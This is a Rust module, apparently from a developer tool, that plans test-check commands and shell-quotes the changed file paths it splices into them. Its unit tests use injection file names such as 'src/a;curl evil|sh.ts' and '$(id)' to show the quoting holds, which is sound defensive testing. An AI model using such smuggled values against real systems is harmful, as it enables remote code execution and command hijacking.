//! Conservative test-target selection planner.
//!
//! Given the set of changed files and a project's `checks` contract, this module
//! decides, for each check, whether it applies and exactly what command to run.
//! It is the input the runner slice consumes; it executes nothing, touches no
//! cache, and does no streaming. Keeping that boundary is deliberate: a pure
//! planner is cheap to unit-test and keeps the runner clean.
//!
//! ## Conservatism is the load-bearing rule
//!
//! Over-including targets only wastes work; UNDER-including risks skipping a
//! check that should have run. So whenever `{targets}` resolution is uncertain
//! (a changed file maps to no known crate, or `cargo metadata` fails or won't
//! parse), the planner degrades the placeholder to an empty string — running the
//! command as a whole-suite full run — rather than guessing a narrow set.

use std::collections::{BTreeSet, HashMap};
use std::path::{Path, PathBuf};

use serde::Deserialize;

use crate::config::project_settings::CheckCommand;
use crate::execution::inputs::{InputSelector, ResolvedInputs};
use crate::jj::GraphFileChange;

/// Placeholder in a `related`-mode command, substituted with the relevant
/// changed files.
const CHANGED_FILES_PLACEHOLDER: &str = "{changedFiles}";
/// Placeholder substituted with the resolved crate-graph target arguments
/// (e.g. `-p crateA -p crateB`).
const TARGETS_PLACEHOLDER: &str = "{targets}";

/// Recover the declared whole-suite command from a safely placed selector.
/// Commands without a selector are already whole-suite commands.
pub(crate) fn whole_suite_command(template: &str) -> Result<String, String> {
    for placeholder in [CHANGED_FILES_PLACEHOLDER, TARGETS_PLACEHOLDER] {
        if template.contains(placeholder) {
            if !placeholder_is_expandable(template, placeholder) {
                return Err(format!(
                    "{placeholder} is not in the supported trailing selector position"
                ));
            }
            return Ok(substitute(template, placeholder, "").trim().to_string());
        }
    }
    Ok(template.to_string())
}

/// Whether a planned run covers the whole check or a selected subset.
///
/// The inheritance step needs this distinction: a `Full` run establishes the
/// authoritative status for every target, while a `Partial` run only refreshes
/// the selected subset and leaves the rest to inherit from a baseline.
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub enum CheckScope {
    Full,
    Partial,
}

/// Whether any path intersects a check's impact set. Invalid globs conservatively match.
#[cfg(test)]
fn paths_match_impact(globs: &[String], paths: &[String]) -> bool {
    let selector = InputSelector::from_globs(globs);
    !selector.narrows() || paths.iter().any(|path| selector.matches(path))
}

/// The decision for a single check: whether it applies to this change set and,
/// if so, the concrete command to run and whether that run is full or partial.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize)]
#[serde(rename_all = "camelCase")]
pub struct CheckPlan {
    /// The check's name (its key in the `checks` map).
    pub(crate) name: String,
    /// Whether this check applies to the change set. A check that does not apply
    /// is skipped by the runner; its `command`/`scope` are populated with the
    /// full-run defaults but unused.
    pub(crate) applies: bool,
    /// The concrete command to run, with any `{changedFiles}`/`{targets}`
    /// placeholder already substituted.
    pub(crate) command: String,
    /// Whether `command` runs the whole check or a selected subset.
    pub(crate) scope: CheckScope,
    /// Process-wide admission class used immediately before process spawn.
    pub(crate) resource_class: crate::config::project_settings::CheckResourceClass,
    /// Environment variables whose values can change this check's verdict.
    /// Includes variables automatically required by the check runtime.
    pub(crate) verdict_environment_names: Vec<String>,
    /// Platforms whose observations the project accepts as this check's verdict.
    pub(crate) verdict_platforms: Vec<String>,
    /// Set when the check's DECLARATION cannot be expanded safely, which makes
    /// the check unrunnable rather than merely un-narrowed.
    ///
    /// There is no honest command to run in that case. Deleting the placeholder
    /// would fabricate one the project never declared — `tool --files
    /// "{changedFiles}"` would become `tool --files ""`, which is not that tool's
    /// whole-suite form and may select nothing — and reporting a full run over a
    /// possibly-empty selection is exactly the vacuous green the checks contract
    /// exists to prevent. So the runner executes nothing, caches nothing (this is
    /// a property of the config, not of the tree), and reports the check failed
    /// with this diagnostic.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub(crate) config_error: Option<String>,
}

/// Plan every check against a change set.
///
/// Returns one [`CheckPlan`] per check, ordered by check name for determinism
/// (the input is an unordered map). `repo_root` is the worktree root the
/// `changed_files` paths are relative to; it anchors crate-graph resolution.
/// `inputs` carries each check's resolved input set — the SAME object the cache
/// key is derived from, so applicability and keying cannot disagree about what a
/// check's inputs are.
pub(crate) fn plan_checks(
    checks: &HashMap<String, CheckCommand>,
    inputs: &ResolvedInputs,
    changed_files: &[GraphFileChange],
    repo_root: &Path,
) -> Vec<CheckPlan> {
    let mut plans: Vec<CheckPlan> = checks
        .iter()
        .map(|(name, check)| {
            plan_one(
                name,
                check,
                inputs.for_check(name),
                changed_files,
                repo_root,
            )
        })
        .collect();
    plans.sort_by(|a, b| a.name.cmp(&b.name));
    plans
}

/// The plan for a check whose declaration puts its placeholder somewhere the
/// expansion contract cannot cover.
///
/// The command is carried through VERBATIM, for display only — it is never run.
/// The contract supports one shape, and a declaration outside it has no derivable
/// whole-suite form: the uncertain-`{targets}` fallback works only because
/// dropping a trailing unquoted ` {targets}` restores the declared base command,
/// which is not true of any other position.
fn unexpandable_plan(name: &str, check: &CheckCommand, placeholder: &str) -> CheckPlan {
    let error = format!(
        "check {name:?} declares {placeholder} in a position the expansion contract \
         does not support. It must appear exactly once, as the final \
         whitespace-delimited token of a single simple command, outside every quote, \
         escape, comment, and shell operator. Nothing was run: there is no whole-suite \
         form of this command to fall back to."
    );
    log::warn!("{error}");
    CheckPlan {
        name: name.to_string(),
        applies: true,
        command: check.command.clone(),
        scope: CheckScope::Full,
        resource_class: check.resource_class,
        verdict_environment_names: crate::execution::check_identity::verdict_environment_names(
            check,
        ),
        verdict_platforms: crate::execution::check_identity::verdict_platforms(check),
        config_error: Some(error),
    }
}

/// Plan a single check. Split out so the per-check rules read top-to-bottom.
fn plan_one(
    name: &str,
    check: &CheckCommand,
    selector: &InputSelector,
    changed_files: &[GraphFileChange],
    repo_root: &Path,
) -> CheckPlan {
    let full_plan = |scope: CheckScope, applies: bool| CheckPlan {
        name: name.to_string(),
        applies,
        command: check.command.clone(),
        scope,
        resource_class: check.resource_class,
        verdict_environment_names: crate::execution::check_identity::verdict_environment_names(
            check,
        ),
        verdict_platforms: crate::execution::check_identity::verdict_platforms(check),
        config_error: None,
    };

    // An invalid DECLARATION is unrunnable, not merely un-narrowed: there is no
    // honest input set to key a verdict by. Same treatment as an unexpandable
    // placeholder — nothing runs, nothing caches, the diagnostic is the failure.
    if let Some(error) = selector.config_error() {
        let error = format!("check {name:?} {error}");
        log::warn!("{error}");
        return CheckPlan {
            config_error: Some(error),
            ..full_plan(CheckScope::Full, true)
        };
    }

    // Coarse gate: does this check apply at all? A check that declares no inputs
    // is triggered by any change; one whose inputs resolved is triggered only by
    // a change intersecting them. A DECLARED selector that would not resolve (an
    // invalid glob, an underivable closure) cannot prove non-application, so it
    // applies and runs its whole-suite command.
    let matched: Vec<String> = if selector.narrows() {
        let matched: Vec<String> = all_candidate_paths(changed_files)
            .into_iter()
            .filter(|path| selector.matches(path))
            .collect();
        if matched.is_empty() {
            return full_plan(CheckScope::Full, false);
        }
        matched
    } else if selector.is_declared() {
        return full_plan(CheckScope::Full, true);
    } else {
        if changed_files.is_empty() {
            return full_plan(CheckScope::Full, false);
        }
        all_candidate_paths(changed_files)
    };

    // The check applies. Selectivity is expressed by a placeholder inside the
    // command — the placeholder *is* the selector, and its resolver is implied.
    if check.command.contains(CHANGED_FILES_PLACEHOLDER) {
        // `{changedFiles}` → the impact-matched changed files, expanded only where
        // the declaration puts the placeholder somewhere expansion is inert.
        if !placeholder_is_expandable(&check.command, CHANGED_FILES_PLACEHOLDER) {
            return unexpandable_plan(name, check, CHANGED_FILES_PLACEHOLDER);
        }
        let command = substitute(
            &check.command,
            CHANGED_FILES_PLACEHOLDER,
            &join_args_encoded(matched.iter().map(String::as_str), encode_path_token),
        );
        CheckPlan {
            name: name.to_string(),
            applies: true,
            command,
            scope: CheckScope::Partial,
            resource_class: check.resource_class,
            verdict_environment_names: crate::execution::check_identity::verdict_environment_names(
                check,
            ),
            verdict_platforms: crate::execution::check_identity::verdict_platforms(check),
            config_error: None,
        }
    } else if check.command.contains(TARGETS_PLACEHOLDER) {
        if !placeholder_is_expandable(&check.command, TARGETS_PLACEHOLDER) {
            return unexpandable_plan(name, check, TARGETS_PLACEHOLDER);
        }
        // `{targets}` → crate-graph targets resolved from the matched files. On
        // uncertain resolution the placeholder degrades to an empty string, which
        // naturally runs the whole suite (a conservative full run).
        match resolve_crate_targets(&matched, repo_root) {
            Some(targets) if !targets.is_empty() => {
                // Crate names come from `cargo metadata`, so they are already
                // bare words and never option-shaped; they need quoting only as
                // a uniform belt-and-braces pass, not path disambiguation.
                let args = join_args(
                    targets
                        .iter()
                        .flat_map(|c| ["-p", c.as_str()])
                        .collect::<Vec<_>>(),
                );
                let command = substitute(&check.command, TARGETS_PLACEHOLDER, &args);
                CheckPlan {
                    name: name.to_string(),
                    applies: true,
                    command,
                    scope: CheckScope::Partial,
                    resource_class: check.resource_class,
                    verdict_environment_names:
                        crate::execution::check_identity::verdict_environment_names(check),
                    verdict_platforms: crate::execution::check_identity::verdict_platforms(check),
                    config_error: None,
                }
            }
            _ => {
                let command = substitute(&check.command, TARGETS_PLACEHOLDER, "")
                    .trim()
                    .to_string();
                CheckPlan {
                    name: name.to_string(),
                    applies: true,
                    command,
                    scope: CheckScope::Full,
                    resource_class: check.resource_class,
                    verdict_environment_names:
                        crate::execution::check_identity::verdict_environment_names(check),
                    verdict_platforms: crate::execution::check_identity::verdict_platforms(check),
                    config_error: None,
                }
            }
        }
    } else {
        // No placeholder → run the command as-is (a full run).
        full_plan(CheckScope::Full, true)
    }
}

/// Every candidate path across the change set, deduped and sorted. A rename
/// contributes both its new and previous path so a file moved out of a crate
/// still counts against that crate.
fn all_candidate_paths(changed_files: &[GraphFileChange]) -> Vec<String> {
    let mut set: BTreeSet<String> = BTreeSet::new();
    for change in changed_files {
        set.insert(change.path.clone());
        if let Some(prev) = &change.previous_path {
            set.insert(prev.clone());
        }
    }
    set.into_iter().collect()
}

/// The content identity of the tree entries a check's selector selects — its
/// "input hash". `entries` are `(path, blob_id)` pairs from the sealed tree; the
/// matching subset is hashed (sorted for order-independence) so the value changes
/// iff a matching file's content changes or the matched path set changes. The
/// predicate is the SAME [`InputSelector`] the application gate above consults,
/// so there is exactly one answer in the codebase to "is this file an input of
/// this check". An unresolvable selector conservatively includes every entry
/// (over-invalidate, never a false reuse).
pub(crate) fn check_input_hash(entries: &[(String, String)], selector: &InputSelector) -> String {
    use sha2::{Digest, Sha256};
    let mut matched: Vec<&(String, String)> = entries
        .iter()
        .filter(|(path, _)| selector.matches(path))
        .collect();
    matched.sort();
    let mut hasher = Sha256::new();
    for (path, blob) in matched {
        hasher.update(path.as_bytes());
        hasher.update([0u8]);
        hasher.update(blob.as_bytes());
        hasher.update([0u8]);
    }
    format!("{:x}", hasher.finalize())
}

/// Build a [`globset::GlobSet`] from pattern strings, matching the worktree
/// populate matcher's `literal_separator(false)` semantics.
pub(crate) fn build_glob_set(patterns: &[String]) -> Result<globset::GlobSet, String> {
    let mut builder = globset::GlobSetBuilder::new();
    for pattern in patterns {
        let glob = globset::GlobBuilder::new(pattern)
            .literal_separator(false)
            .build()
            .map_err(|e| format!("Invalid glob pattern '{pattern}': {e}"))?;
        builder.add(glob);
    }
    builder
        .build()
        .map_err(|e| format!("Failed to build glob set: {e}"))
}

// ## The placeholder expansion contract
//
// A `{changedFiles}`/`{targets}` placeholder expands to a list of shell WORDS,
// and the values it expands to are not the project's to choose: `{changedFiles}`
// carries repository paths, and a path is named by whoever committed the file.
// The assembled command runs through `bash -c` and, per
// `Fleet::CHECK_CADENCE_SANDBOX_MODE`, unconfined — so expansion is a security
// boundary, not a formatting detail.
//
// Two separate things have to hold, because quoting alone secures neither:
//
// 1. Position (declaration-controlled). Single-quoting produces a shell
//    FRAGMENT, and a fragment is only inert where the shell is not already
//    quoting. Inside double quotes `"'src/$(id).ts'"` still substitutes, because
//    single quotes carry no meaning there. So the placeholder is expanded only
//    where its contract holds: exactly once, whitespace-delimited, at the end of
//    the command, outside any quoting or escape. That position comes from the
//    project's declared config in the live main checkout, so validating it is a
//    check on the declaration, never on attacker input.
// 2. Value (attacker-controlled). Within a position proven unquoted, a
//    single-quoted token is inert; and a token that would otherwise read as an
//    OPTION rather than a path is disambiguated, since quoting cannot help there
//    (`'-x'` and `-x` reach `argv` identically).
//
// A declaration that violates (1) is a configuration bug rather than an attack,
// and is handled the way every other uncertain selector resolution is: the
// placeholder degrades to empty and the check runs its whole-suite command.

/// Whether `template` uses `placeholder` in the one position the expansion
/// contract defines, and may therefore be expanded at all.
///
/// Requires: a non-empty literal head, exactly one occurrence, a whitespace
/// boundary before it, nothing but whitespace after it, and a prefix that leaves
/// the shell outside every quote and escape. Anything else — `tool --files
/// "{changedFiles}"`, `tool --files={changedFiles}`, `tool {targets} --release` —
/// fails closed.
fn placeholder_is_expandable(template: &str, placeholder: &str) -> bool {
    let Some(index) = template.find(placeholder) else {
        return false;
    };
    let (head, tail) = (&template[..index], &template[index + placeholder.len()..]);

    // Exactly one occurrence: a second one would expand the selector twice.
    if tail.contains(placeholder) {
        return false;
    }
    // Trailing, so no declared literal can be absorbed into the expansion.
    if !tail.trim().is_empty() {
        return false;
    }
    // A literal head anchors the command; a bare placeholder has no program.
    if head.trim().is_empty() {
        return false;
    }
    // A whitespace boundary, so the expansion cannot concatenate onto a literal.
    if !head.ends_with(char::is_whitespace) {
        return false;
    }
    head_is_single_simple_command(head)
}

/// Whether `head` is one simple command that the expansion will extend with
/// ARGUMENTS — the only reading under which quoting the appended tokens means
/// anything.
///
/// Quote neutrality alone does not establish this. `tool # c\n ` and `tool ; `
/// are both quote-neutral, yet the first expands after a comment as a new
/// command and the second makes the first expanded token a command NAME rather
/// than an argument — handing execution to a path whoever committed it chose. So
/// every separator, operator, grouping, redirection, comment, and substitution is
/// rejected outside quotes, which leaves a single simple command by construction.
/// The scan doubles as the quote/escape check: it must also END outside every
/// quote and escape, or the appended token would land inside one.
fn head_is_single_simple_command(head: &str) -> bool {
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    for c in head.chars() {
        if escaped {
            escaped = false;
            continue;
        }
        match c {
            // A backslash escapes inside double quotes and when unquoted, but is
            // an ordinary character inside single quotes.
            '\\' if !in_single => escaped = true,
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            ';' | '&' | '|' | '\n' | '\r' | '(' | ')' | '<' | '>' | '#' | '$' | '`'
                if !in_single && !in_double =>
            {
                return false
            }
            _ => {}
        }
    }
    !in_single && !in_double && !escaped
}

/// Join expanded tokens into the command tail with `encode`. Only ever called
/// for a position [`placeholder_is_expandable`] has proven unquoted.
fn join_args_encoded<'a>(
    tokens: impl IntoIterator<Item = &'a str>,
    encode: impl Fn(&str) -> String,
) -> String {
    tokens.into_iter().map(encode).collect::<Vec<_>>().join(" ")
}

/// [`join_args_encoded`] for tokens that are not repository paths and so need no
/// option disambiguation.
fn join_args<'a>(tokens: impl IntoIterator<Item = &'a str>) -> String {
    join_args_encoded(tokens, shell_quote_token)
}

/// A repository path as one shell word that the receiving tool reads as a path
/// rather than as an option.
///
/// A committed file named `--config=attacker.ts` is a bare shell word, so no
/// amount of quoting stops the tool from parsing it as an option — that is an
/// `argv` problem, not a shell problem. `./` names the identical file and cannot
/// be read as an option. Only option-shaped paths are rewritten, so ordinary
/// paths stay byte-identical.
fn encode_path_token(path: &str) -> String {
    if path.starts_with('-') {
        return shell_quote_token(&format!("./{path}"));
    }
    shell_quote_token(path)
}

/// A token the shell parses as one literal word with no expansion: ordinary path
/// and identifier characters only. Deliberately excludes `~` (home expansion) and
/// every quoting, globbing, redirection, and control character.
fn is_bare_shell_word_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | '+' | '=' | ':' | ',' | '@')
}

/// `token` as a single shell word: verbatim when it is already bare, otherwise
/// single-quoted with embedded single quotes escaped the POSIX way (`'\''`).
/// Inert only where the shell is not already quoting, which is why every caller
/// goes through [`placeholder_is_expandable`] first.
fn shell_quote_token(token: &str) -> String {
    if !token.is_empty() && token.chars().all(is_bare_shell_word_char) {
        return token.to_string();
    }
    format!("'{}'", token.replace('\'', r"'\''"))
}

fn substitute(template: &str, placeholder: &str, value: &str) -> String {
    template.replace(placeholder, value)
}

// ---------------------------------------------------------------------------
// Crate-graph resolver (`targets_from: crate-graph`)
// ---------------------------------------------------------------------------

/// Resolve the affected cargo workspace members for a set of changed files.
///
/// Runs `cargo metadata` over the Rust workspace at `repo_root/src-tauri`, maps
/// each changed file to its owning member, then expands to the transitive
/// reverse-dependency closure within the workspace (a change in crate X affects
/// X and every member that transitively depends on X).
///
/// Returns `None` whenever resolution is uncertain — metadata fails or won't
/// parse, or a changed file maps to no member — so the caller falls back to a
/// full run rather than under-selecting.
fn resolve_crate_targets(changed_files: &[String], repo_root: &Path) -> Option<Vec<String>> {
    let rust_root = repo_root.join("src-tauri");
    let metadata_json = run_cargo_metadata(&rust_root)?;
    resolve_crate_targets_from_metadata(&metadata_json, changed_files, repo_root)
}

/// Run `cargo metadata --format-version 1 --no-deps` in `rust_root`, returning
/// its stdout JSON, or `None` on any spawn/exit failure. `--no-deps` restricts
/// `packages` to workspace members, which is all the reverse-dependency closure
/// needs and keeps the call fast and hermetic.
fn run_cargo_metadata(rust_root: &Path) -> Option<String> {
    let output = std::process::Command::new("cargo")
        .args(["metadata", "--format-version", "1", "--no-deps"])
        .current_dir(rust_root)
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    String::from_utf8(output.stdout).ok()
}

/// Minimal projection of `cargo metadata` output. Unknown fields are ignored.
#[derive(Debug, Deserialize)]
struct CargoMetadata {
    packages: Vec<CargoPackage>,
}

#[derive(Debug, Deserialize)]
struct CargoPackage {
    name: String,
    manifest_path: String,
    #[serde(default)]
    dependencies: Vec<CargoDependency>,
}

#[derive(Debug, Deserialize)]
struct CargoDependency {
    name: String,
}

/// Pure core of the crate-graph resolver: parse metadata JSON, map changed files
/// to members, and expand to the reverse-dependency closure. Split from the
/// `cargo` invocation so it can be unit-tested with a fixture without shelling
/// out. Returns `None` on the same uncertainty conditions as
/// [`resolve_crate_targets`].
fn resolve_crate_targets_from_metadata(
    metadata_json: &str,
    changed_files: &[String],
    repo_root: &Path,
) -> Option<Vec<String>> {
    let metadata: CargoMetadata = serde_json::from_str(metadata_json).ok()?;

    // Member name -> package directory (the manifest's parent).
    let member_dirs: Vec<(String, PathBuf)> = metadata
        .packages
        .iter()
        .filter_map(|pkg| {
            Path::new(&pkg.manifest_path)
                .parent()
                .map(|dir| (pkg.name.clone(), dir.to_path_buf()))
        })
        .collect();
    let member_names: BTreeSet<&str> = metadata.packages.iter().map(|p| p.name.as_str()).collect();

    // Map each changed file to its owning member by longest package-dir prefix
    // (deepest wins, so a file in a nested member is attributed to that member,
    // not an ancestor workspace member). Any unmappable file is uncertain.
    let mut seeds: BTreeSet<String> = BTreeSet::new();
    for file in changed_files {
        let file_abs = repo_root.join(file);
        let owner = member_dirs
            .iter()
            .filter(|(_, dir)| file_abs.starts_with(dir))
            .max_by_key(|(_, dir)| dir.components().count());
        match owner {
            Some((name, _)) => {
                seeds.insert(name.clone());
            }
            None => return None,
        }
    }

    // Reverse edges: member -> members that depend on it (workspace-internal
    // only). Built from each package's declared dependencies filtered to members.
    let mut dependents: HashMap<&str, Vec<&str>> = HashMap::new();
    for pkg in &metadata.packages {
        for dep in &pkg.dependencies {
            if member_names.contains(dep.name.as_str()) {
                dependents
                    .entry(dep.name.as_str())
                    .or_default()
                    .push(pkg.name.as_str());
            }
        }
    }

    // Transitive reverse-dependency closure over the seeds.
    let mut affected: BTreeSet<String> = BTreeSet::new();
    let mut stack: Vec<String> = seeds.into_iter().collect();
    while let Some(crate_name) = stack.pop() {
        if !affected.insert(crate_name.clone()) {
            continue;
        }
        if let Some(rdeps) = dependents.get(crate_name.as_str()) {
            for rdep in rdeps {
                if !affected.contains(*rdep) {
                    stack.push((*rdep).to_string());
                }
            }
        }
    }

    Some(affected.into_iter().collect())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn change(path: &str, status: &str) -> GraphFileChange {
        GraphFileChange {
            path: path.to_string(),
            previous_path: None,
            status: status.to_string(),
            additions: 1,
            deletions: 0,
        }
    }

    fn rename(from: &str, to: &str) -> GraphFileChange {
        GraphFileChange {
            path: to.to_string(),
            previous_path: Some(from.to_string()),
            status: "renamed".to_string(),
            additions: 0,
            deletions: 0,
        }
    }

    fn check(command: &str, impact: Option<&[&str]>) -> CheckCommand {
        CheckCommand {
            command: command.to_string(),
            impact: impact.map(|globs| globs.iter().map(|s| s.to_string()).collect()),
            scope: None,
            policy: crate::config::project_settings::CheckPolicy::Advisory,
            when: crate::config::project_settings::CheckWhen::Write,
            resource_class: crate::config::project_settings::CheckResourceClass::Shared,
            timeout: None,
            executor: None,
            verdict_environment: Vec::new(),
            verdict_platforms: None,
            fixes: false,
        }
    }

    /// Every check's selector, resolved with no tree in hand — the glob and
    /// no-input cases these tests exercise resolve identically to production.
    fn inputs(checks: &HashMap<String, CheckCommand>) -> crate::execution::inputs::ResolvedInputs {
        crate::execution::inputs::ResolvedInputs::resolve(
            checks,
            &HashMap::new(),
            &crate::execution::inputs::TreeSnapshot::empty(),
        )
    }

    fn plan_for(check: CheckCommand, changed: &[GraphFileChange]) -> CheckPlan {
        let mut map = HashMap::new();
        map.insert("check".to_string(), check);
        plan_checks(&map, &inputs(&map), changed, Path::new("/repo"))
            .into_iter()
            .next()
            .unwrap()
    }

    #[test]
    fn manual_cache_dirt_only_invalidates_matching_impact() {
        let globs = vec!["src-tauri/**/*.rs".to_string(), "package.json".to_string()];
        assert!(paths_match_impact(
            &globs,
            &["src-tauri/os/cairn-core/src/lib.rs".to_string()]
        ));
        assert!(!paths_match_impact(&globs, &["docs/checks.md".to_string()]));
        assert!(paths_match_impact(
            &["[invalid".to_string()],
            &["docs/checks.md".to_string()]
        ));
    }

    // --- coarse gate: applies / does-not-apply -----------------------------

    #[test]
    fn impact_glob_applies_when_a_changed_file_matches() {
        let c = check("cargo test", Some(&["src-tauri/**/*.rs"]));
        let plan = plan_for(
            c,
            &[change("src-tauri/os/cairn-core/src/lib.rs", "modified")],
        );
        assert!(plan.applies);
        assert_eq!(plan.scope, CheckScope::Full);
        assert_eq!(plan.command, "cargo test");
    }

    #[test]
    fn impact_glob_does_not_apply_when_no_changed_file_matches() {
        let c = check("cargo test", Some(&["src-tauri/**/*.rs"]));
        let plan = plan_for(c, &[change("web/src/App.tsx", "modified")]);
        assert!(!plan.applies);
    }

    #[test]
    fn no_impact_applies_to_any_change() {
        let c = check("cargo test", None);
        let plan = plan_for(c, &[change("anything.md", "modified")]);
        assert!(plan.applies);
        assert_eq!(plan.scope, CheckScope::Full);
    }

    #[test]
    fn no_impact_does_not_apply_to_empty_change_set() {
        let c = check("cargo test", None);
        let plan = plan_for(c, &[]);
        assert!(!plan.applies);
    }

    #[test]
    fn invalid_glob_falls_back_to_full_and_applies() {
        // An unclosed bracket is an invalid glob.
        let c = check("cargo test", Some(&["src-tauri/["]));
        let plan = plan_for(c, &[change("src-tauri/x.rs", "modified")]);
        assert!(plan.applies);
        assert_eq!(plan.scope, CheckScope::Full);
        assert_eq!(plan.command, "cargo test");
    }

    // --- no placeholder -> full --------------------------------------------

    #[test]
    fn no_placeholder_runs_full() {
        let c = check("bun run check", None);
        let plan = plan_for(c, &[change("src/App.tsx", "modified")]);
        assert!(plan.applies);
        assert_eq!(plan.scope, CheckScope::Full);
        assert_eq!(plan.command, "bun run check");
    }

    // --- {changedFiles} substitution ---------------------------------------

    #[test]
    fn whole_suite_command_drops_only_a_safe_trailing_selector() {
        assert_eq!(
            whole_suite_command("bun run test:rust {changedFiles}").unwrap(),
            "bun run test:rust"
        );
        assert_eq!(whole_suite_command("cargo test").unwrap(), "cargo test");
        assert!(whole_suite_command("tool --files={changedFiles}").is_err());
    }

    #[test]
    fn related_substitutes_matched_changed_files() {
        let c = check(
            "vitest related {changedFiles}",
            Some(&["**/*.ts", "**/*.tsx"]),
        );
        let plan = plan_for(
            c,
            &[
                change("src/a.ts", "modified"),
                change("src/b.tsx", "added"),
                change("README.md", "modified"),
            ],
        );
        assert!(plan.applies);
        assert_eq!(plan.scope, CheckScope::Partial);
        // README.md is excluded; matched paths are sorted.
        assert_eq!(plan.command, "vitest related src/a.ts src/b.tsx");
    }

    #[test]
    fn related_with_no_impact_uses_all_changed_files() {
        let c = check("vitest related {changedFiles}", None);
        let plan = plan_for(
            c,
            &[change("src/b.ts", "modified"), change("src/a.ts", "added")],
        );
        assert_eq!(plan.scope, CheckScope::Partial);
        assert_eq!(plan.command, "vitest related src/a.ts src/b.ts");
    }

    #[test]
    fn related_rename_includes_previous_path() {
        let c = check("vitest related {changedFiles}", Some(&["src/**/*.ts"]));
        let plan = plan_for(c, &[rename("src/old.ts", "src/new.ts")]);
        assert_eq!(plan.command, "vitest related src/new.ts src/old.ts");
    }

    // --- substituted arguments stay arguments ------------------------------

    #[test]
    fn substituted_changed_file_cannot_inject_shell() {
        // The command is assembled for `bash -c` and runs unconfined, so a path
        // named by whoever committed the file must survive as one literal word.
        let c = check("vitest related {changedFiles}", Some(&["src/**"]));
        let plan = plan_for(c, &[change("src/a;curl evil|sh.ts", "added")]);
        assert_eq!(plan.command, "vitest related 'src/a;curl evil|sh.ts'");
    }

    #[test]
    fn substituted_changed_file_with_quote_is_escaped() {
        let c = check("vitest related {changedFiles}", Some(&["src/**"]));
        let plan = plan_for(c, &[change("src/it's.ts", "added")]);
        assert_eq!(plan.command, r"vitest related 'src/it'\''s.ts'");
    }

    #[test]
    fn option_shaped_paths_are_disambiguated_not_just_quoted() {
        // Quoting cannot fix this: `'-x'` and `-x` reach argv identically, so a
        // committed file named like an option would stay an option to the tool.
        let c = check("vitest related {changedFiles}", Some(&["**"]));
        let plan = plan_for(c, &[change("--config=attacker.ts", "added")]);
        assert_eq!(plan.command, "vitest related ./--config=attacker.ts");

        assert_eq!(encode_path_token("-rf"), "./-rf");
        // Disambiguation and quoting compose for a path that needs both.
        assert_eq!(encode_path_token("--out=$(id)"), "'./--out=$(id)'");
        // A path that merely contains a dash is untouched.
        assert_eq!(encode_path_token("src/my-file.ts"), "src/my-file.ts");
    }

    // --- the expansion contract: only an inert position expands -------------

    #[test]
    fn quoted_placeholder_is_not_expanded() {
        // Single quotes carry no meaning inside double quotes, so a quoted token
        // spliced here would still be substituted by the shell. Refuse to expand
        // and run the whole suite instead.
        for template in [
            "tool --files \"{changedFiles}\"",
            "tool --files '{changedFiles}'",
            "tool \"a b\" --files \"{changedFiles}\"",
        ] {
            assert!(
                !placeholder_is_expandable(template, CHANGED_FILES_PLACEHOLDER),
                "quoted placeholder must not expand: {template}"
            );
        }

        // A quoted placeholder has no derivable whole-suite form, so the
        // declaration is carried through verbatim for display and marked
        // unrunnable rather than expanded to an empty selection.
        let c = check("tool --files \"{changedFiles}\"", Some(&["src/**"]));
        let plan = plan_for(c, &[change("src/$(id).ts", "added")]);
        assert_eq!(plan.scope, CheckScope::Full);
        assert!(
            !plan.command.contains("$(id)"),
            "attacker-named path must never reach a quoted context: {}",
            plan.command
        );
        assert_eq!(plan.command, "tool --files \"{changedFiles}\"");
        assert!(
            plan.config_error.is_some(),
            "an unexpandable declaration must be reported unrunnable, not run"
        );
    }

    #[test]
    fn escaped_or_concatenated_placeholder_is_not_expanded() {
        for template in [
            // Mid-escape: the backslash would consume the opening quote.
            r#"tool --files \{changedFiles}"#,
            // Concatenated onto a literal: expansion would fuse with `--files=`.
            "tool --files={changedFiles}",
            // Not trailing: a declared literal would be absorbed after expansion.
            "tool {changedFiles} --reporter=json",
            // Twice: the selector would be expanded into two places.
            "tool {changedFiles} {changedFiles}",
            // No literal head: there is no program to run.
            "{changedFiles}",
        ] {
            assert!(
                !placeholder_is_expandable(template, CHANGED_FILES_PLACEHOLDER),
                "must not expand: {template}"
            );
        }
    }

    #[test]
    fn declared_repository_check_shapes_remain_expandable() {
        // The shapes this project actually declares must keep narrowing.
        for template in [
            "bunx vitest related {changedFiles}",
            "bunx vitest related --reporter=default --reporter=json {changedFiles}",
        ] {
            assert!(
                placeholder_is_expandable(template, CHANGED_FILES_PLACEHOLDER),
                "declared shape must expand: {template}"
            );
        }
        assert!(placeholder_is_expandable(
            "bun run test:rust {targets}",
            TARGETS_PLACEHOLDER
        ));
    }

    /// The quote/escape half of the head scan: a head that ends inside a quote
    /// or escape would swallow the appended token, whatever else it contains.
    #[test]
    fn head_scan_tracks_quotes_and_escapes() {
        assert!(head_is_single_simple_command("tool --files "));
        assert!(head_is_single_simple_command(r#"tool "a b" "#));
        assert!(head_is_single_simple_command("tool 'a b' "));
        // A single quote inside double quotes is literal, so this stays neutral.
        assert!(head_is_single_simple_command("tool \"it's\" "));

        assert!(!head_is_single_simple_command("tool \""));
        assert!(!head_is_single_simple_command("tool '"));
        assert!(!head_is_single_simple_command(r"tool \"));
        // A double quote inside single quotes does not open a double-quote span.
        assert!(!head_is_single_simple_command("tool 'a\"b"));
    }

    #[test]
    fn substituted_expansion_characters_are_quoted() {
        // Globs, home expansion, and substitution must not reach the shell even
        // though none of them are separators.
        assert_eq!(shell_quote_token("src/*.ts"), "'src/*.ts'");
        assert_eq!(shell_quote_token("~/x.ts"), "'~/x.ts'");
        assert_eq!(shell_quote_token("$(id).ts"), "'$(id).ts'");
        assert_eq!(shell_quote_token("a b.ts"), "'a b.ts'");
        assert_eq!(shell_quote_token(""), "''");
    }

    #[test]
    fn ordinary_tokens_are_emitted_verbatim() {
        // The quoting guard must not churn the command string in the ordinary
        // case: the command is part of a check's result key, so a gratuitous
        // quote would invalidate every cached verdict.
        for token in [
            "src/a.ts",
            "packages/ui/src/Button.tsx",
            "-p",
